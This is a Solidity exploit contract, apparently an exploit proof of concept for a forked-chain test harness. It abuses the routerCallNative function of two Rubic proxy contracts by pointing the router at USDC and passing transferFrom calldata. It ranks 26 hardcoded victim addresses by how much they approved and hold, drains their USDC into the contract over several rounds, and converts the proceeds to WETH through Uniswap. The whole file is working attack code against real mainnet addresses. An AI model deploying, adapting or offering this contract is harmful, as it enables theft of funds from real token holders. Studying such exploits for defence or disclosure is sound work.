// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address owner, address recipient, uint256 amount) external returns (bool);
}

interface IRubicProxy1 {
    struct BaseCrossChainParams {
        address srcInputToken;
        uint256 srcInputAmount;
        uint256 dstChainID;
        address dstOutputToken;
        uint256 dstMinOutputAmount;
        address recipient;
        address integrator;
        address router;
    }

    function routerCallNative(BaseCrossChainParams calldata _params, bytes calldata _data) external;
}

interface IRubicProxy2 {
    struct BaseCrossChainParams {
        address srcInputToken;
        uint256 srcInputAmount;
        uint256 dstChainID;
        address dstOutputToken;
        uint256 dstMinOutputAmount;
        address recipient;
        address integrator;
        address router;
    }

    function routerCallNative(
        string calldata _providerInfo,
        BaseCrossChainParams calldata _params,
        bytes calldata _data
    ) external;
}

interface IUniswapV3SwapRouter {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
}

interface IUniswapV2Router02 {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

contract FlawVerifier {
    struct Candidate {
        address victim;
        address proxy;
        uint8 variant;
        uint256 amount;
    }

    IERC20Like private constant USDC = IERC20Like(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20Like private constant WETH = IERC20Like(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    address private constant PROXY1 = 0x3335A88bb18fD3b6824b59Af62b50CE494143333;
    address private constant PROXY2 = 0x33388CF69e032C6f60A420b37E44b1F5443d3333;
    address private constant INTEGRATOR = 0x677d6EC74fA352D4Ef9B1886F6155384aCD70D90;

    IUniswapV3SwapRouter private constant UNISWAP_V3_ROUTER =
        IUniswapV3SwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
    IUniswapV2Router02 private constant UNISWAP_V2_ROUTER =
        IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    uint256 private constant CANDIDATE_COUNT = 26;
    uint256 private constant MAX_PROGRESSIVE_ROUNDS = 6;
    uint256 private constant MAX_UINT = type(uint256).max;

    uint256 private _profitAmount;
    bool private _executed;

    constructor() {}

    function executeOnOpportunity() external {
        require(!_executed, "executed");
        _executed = true;

        Candidate[CANDIDATE_COUNT] memory ranked = _rankCandidatesByStealableAmount();
        uint256 positiveCount = _countPositive(ranked);
        if (positiveCount == 0) {
            _profitAmount = 0;
            return;
        }

        uint256 cappedRounds = positiveCount < MAX_PROGRESSIVE_ROUNDS ? positiveCount : MAX_PROGRESSIVE_ROUNDS;
        uint256 successfulRounds;
        uint256 scanIndex;
        uint256 bestStolenUsdc;

        // Progressive amplification requirement:
        // begin from 2 successful exploit rounds when possible, then extend one-by-one
        // (2 -> 3 -> 4 -> 5 -> 6), stopping when an added round no longer improves net
        // realized profit. The exploit's direct economic output is stolen USDC principal,
        // so the improvement check is performed on actually received USDC before the final
        // public-market liquidation step into WETH. Candidates are only counted as rounds
        // if the real transferFrom lands USDC in this contract at the fork state.
        uint256 initialTargetRounds = cappedRounds == 1 ? 1 : 2;
        while (successfulRounds < initialTargetRounds && scanIndex < positiveCount) {
            uint256 received = _drainCandidate(ranked[scanIndex]);
            scanIndex++;
            if (received > 0) {
                successfulRounds++;
                bestStolenUsdc += received;
            }
        }

        if (successfulRounds == 0) {
            _profitAmount = 0;
            return;
        }

        if (successfulRounds == 1 || cappedRounds == 1) {
            _profitAmount = _finalizeProfit();
            return;
        }

        while (successfulRounds < cappedRounds) {
            bool foundAdditionalRound;
            uint256 roundGain;

            while (scanIndex < positiveCount) {
                uint256 received = _drainCandidate(ranked[scanIndex]);
                scanIndex++;
                if (received > 0) {
                    foundAdditionalRound = true;
                    successfulRounds++;
                    roundGain = received;
                    break;
                }
            }

            if (!foundAdditionalRound) {
                break;
            }

            uint256 candidateTotal = bestStolenUsdc + roundGain;
            if (candidateTotal > bestStolenUsdc) {
                bestStolenUsdc = candidateTotal;
            } else {
                break;
            }
        }

        _profitAmount = _finalizeProfit();
    }

    function profitToken() external pure returns (address) {
        return address(WETH);
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _drainCandidate(Candidate memory candidate) private returns (uint256 received) {
        if (candidate.amount == 0) {
            return 0;
        }

        uint256 usdcBefore = USDC.balanceOf(address(this));

        // Exploit path 1:
        // choose a victim that already approved one of the vulnerable Rubic proxies and
        // whose live fork-state balance/allowance still supports a real drain.
        address victim = candidate.victim;
        uint256 stealAmount = candidate.amount;

        // Exploit path 3:
        // encode _data as transferFrom(victim, attacker, amount) so the proxy forwards a
        // raw ERC20 pull while acting as the already-approved spender.
        bytes memory tokenTransferFromCalldata = abi.encodeWithSelector(
            IERC20Like.transferFrom.selector,
            victim,
            address(this),
            stealAmount
        );

        if (candidate.variant == 1) {
            IRubicProxy1.BaseCrossChainParams memory params1 = IRubicProxy1.BaseCrossChainParams({
                srcInputToken: address(0),
                srcInputAmount: 0,
                dstChainID: 0,
                dstOutputToken: address(0),
                dstMinOutputAmount: 0,
                recipient: address(0),
                integrator: INTEGRATOR,
                // Exploit path 2:
                // set _params.router to the already-deployed USDC contract so the proxy
                // executes the attacker-controlled token call against that ERC20.
                router: address(USDC)
            });

            // Exploit path 4:
            // call routerCallNative(...) so the proxy itself executes USDC.transferFrom as
            // spender and moves the victim's approved funds to this contract.
            try IRubicProxy1(candidate.proxy).routerCallNative(params1, tokenTransferFromCalldata) {} catch {}
        } else {
            IRubicProxy2.BaseCrossChainParams memory params2 = IRubicProxy2.BaseCrossChainParams({
                srcInputToken: address(0),
                srcInputAmount: 0,
                dstChainID: 0,
                dstOutputToken: address(0),
                dstMinOutputAmount: 0,
                recipient: address(0),
                integrator: INTEGRATOR,
                // Exploit path 2:
                // set _params.router to the already-deployed USDC contract so the proxy
                // executes the attacker-controlled token call against that ERC20.
                router: address(USDC)
            });

            // Exploit path 4:
            // call routerCallNative(...) so the proxy itself executes USDC.transferFrom as
            // spender and moves the victim's approved funds to this contract.
            try IRubicProxy2(candidate.proxy).routerCallNative("", params2, tokenTransferFromCalldata) {} catch {}
        }

        received = USDC.balanceOf(address(this)) - usdcBefore;
    }

    function _swapAllUsdcToWeth() private {
        uint256 usdcBalance = USDC.balanceOf(address(this));
        if (usdcBalance == 0) {
            return;
        }

        // Realistic public on-chain monetization step:
        // convert stolen USDC into already-deployed WETH through public Uniswap liquidity.
        // This does not alter exploit causality; it only realizes the stolen proceeds in the
        // profit token measured by the harness.
        _approveIfNeeded(USDC, address(UNISWAP_V3_ROUTER), usdcBalance);

        bool swapped = _swapViaUniswapV3(usdcBalance, 500);
        if (!swapped) {
            swapped = _swapViaUniswapV3(usdcBalance, 3000);
        }

        if (!swapped) {
            _approveIfNeeded(USDC, address(UNISWAP_V2_ROUTER), usdcBalance);
            address[] memory path = new address[](2);
            path[0] = address(USDC);
            path[1] = address(WETH);
            try UNISWAP_V2_ROUTER.swapExactTokensForTokens(usdcBalance, 0, path, address(this), block.timestamp) {
                swapped = true;
            } catch {}
        }

        require(swapped, "swap failed");
    }

    function _finalizeProfit() private returns (uint256 realizedProfit) {
        uint256 wethBefore = WETH.balanceOf(address(this));
        _swapAllUsdcToWeth();
        realizedProfit = WETH.balanceOf(address(this)) - wethBefore;
    }

    function _swapViaUniswapV3(uint256 amountIn, uint24 fee) private returns (bool swapped) {
        IUniswapV3SwapRouter.ExactInputSingleParams memory params = IUniswapV3SwapRouter.ExactInputSingleParams({
            tokenIn: address(USDC),
            tokenOut: address(WETH),
            fee: fee,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: amountIn,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });

        try UNISWAP_V3_ROUTER.exactInputSingle(params) returns (uint256 amountOut) {
            swapped = amountOut > 0;
        } catch {}
    }

    function _approveIfNeeded(IERC20Like token, address spender, uint256 requiredAmount) private {
        if (token.allowance(address(this), spender) >= requiredAmount) {
            return;
        }

        require(token.approve(spender, 0), "approve reset failed");
        require(token.approve(spender, MAX_UINT), "approve failed");
    }

    function _rankCandidatesByStealableAmount() private view returns (Candidate[CANDIDATE_COUNT] memory ranked) {
        ranked[0] = _identifyApprovedVictim(0x6b8D6E89590E41Fa7484691fA372c3552E93e91b, PROXY1, 1);
        ranked[1] = _identifyApprovedVictim(0x036B5805F9175297Ec2adE91678d6ea0a1e2272A, PROXY1, 1);
        ranked[2] = _identifyApprovedVictim(0xED9c18C5311DBB2b757B6913fB3FE6aa22b1A5b0, PROXY1, 1);
        ranked[3] = _identifyApprovedVictim(0xff266f62a0152F39FCf123B7086012cEb292516A, PROXY1, 1);
        ranked[4] = _identifyApprovedVictim(0x90d9b9CC1BFB77d96f9a44731159DdbcA824C63D, PROXY1, 1);
        ranked[5] = _identifyApprovedVictim(0x1dAeB36442d0B0B28e5c018078b672CF9ee9753B, PROXY1, 1);
        ranked[6] = _identifyApprovedVictim(0xF2E3628f7A85f03F0800712DF3c2EBc5BDb33981, PROXY1, 1);
        ranked[7] = _identifyApprovedVictim(0xf3f4470d71b94CD74435e2e0f0dE0DaD11eC7C5a, PROXY1, 1);
        ranked[8] = _identifyApprovedVictim(0x915E88322EDFa596d29BdF163b5197c53cDB1A68, PROXY2, 2);
        ranked[9] = _identifyApprovedVictim(0xD6aD4bcbb33215C4b63DeDa55de599d0d56BCdf5, PROXY2, 2);
        ranked[10] = _identifyApprovedVictim(0x2afeF7d7de9E1a991c385a78Fb6c950AA3487dbA, PROXY2, 2);
        ranked[11] = _identifyApprovedVictim(0x21FeBbFf2da0F3195b61eC0cA1B38Aa1f7105cDb, PROXY2, 2);
        ranked[12] = _identifyApprovedVictim(0xDbDDb2D6F3d387c0dDA16E197cd1E490543354e1, PROXY2, 2);
        ranked[13] = _identifyApprovedVictim(0x58709C660B2d908098FE95758C8a872a3CaA6635, PROXY2, 2);
        ranked[14] = _identifyApprovedVictim(0xD2C919D3bf4557419CbB519b1Bc272b510BC59D9, PROXY2, 2);
        ranked[15] = _identifyApprovedVictim(0xfE243903c13B53A57376D27CA91360C6E6b3FfAC, PROXY2, 2);
        ranked[16] = _identifyApprovedVictim(0xd5BD9464eB1A73Cca1970655708AE4F560Efc6D1, PROXY2, 2);
        ranked[17] = _identifyApprovedVictim(0xd6389E37f7c2dB6De56b92f430735D08d702111E, PROXY2, 2);
        ranked[18] = _identifyApprovedVictim(0x9f3119BEe3766b2CD25BF3808a8646A7F22ccDDC, PROXY2, 2);
        ranked[19] = _identifyApprovedVictim(0x8a4295b205DD78Bf3948D2D38a08BaAD4D28CB37, PROXY2, 2);
        ranked[20] = _identifyApprovedVictim(0xf4BA068f3F79aCBf148b43ae8F1db31F04E53861, PROXY2, 2);
        ranked[21] = _identifyApprovedVictim(0x48327499E4D71ED983DC7E024DdEd4EBB19BDb28, PROXY2, 2);
        ranked[22] = _identifyApprovedVictim(0x192FcF067D36a8BC9322b96Bb66866c52C43B43F, PROXY2, 2);
        ranked[23] = _identifyApprovedVictim(0x82Bdfc6aBe9d1dfA205f33869e1eADb729590805, PROXY2, 2);
        ranked[24] = _identifyApprovedVictim(0x44a59A1d38718c5cA8cB6E8AA7956859D947344B, PROXY2, 2);
        ranked[25] = _identifyApprovedVictim(0xD0245a08f5f5c54A24907249651bEE39F3fE7014, PROXY2, 2);

        for (uint256 i = 0; i < ranked.length; i++) {
            uint256 maxIndex = i;
            for (uint256 j = i + 1; j < ranked.length; j++) {
                if (ranked[j].amount > ranked[maxIndex].amount) {
                    maxIndex = j;
                }
            }

            if (maxIndex != i) {
                Candidate memory temp = ranked[i];
                ranked[i] = ranked[maxIndex];
                ranked[maxIndex] = temp;
            }
        }
    }

    function _identifyApprovedVictim(address victim, address proxy, uint8 variant)
        private
        view
        returns (Candidate memory item)
    {
        uint256 balance = USDC.balanceOf(victim);
        uint256 approved = USDC.allowance(victim, proxy);
        uint256 amount = balance < approved ? balance : approved;

        item = Candidate({victim: victim, proxy: proxy, variant: variant, amount: amount});
    }

    function _countPositive(Candidate[CANDIDATE_COUNT] memory ranked) private pure returns (uint256 count) {
        for (uint256 i = 0; i < ranked.length; i++) {
            if (ranked[i].amount == 0) {
                break;
            }
            count++;
        }
    }
}
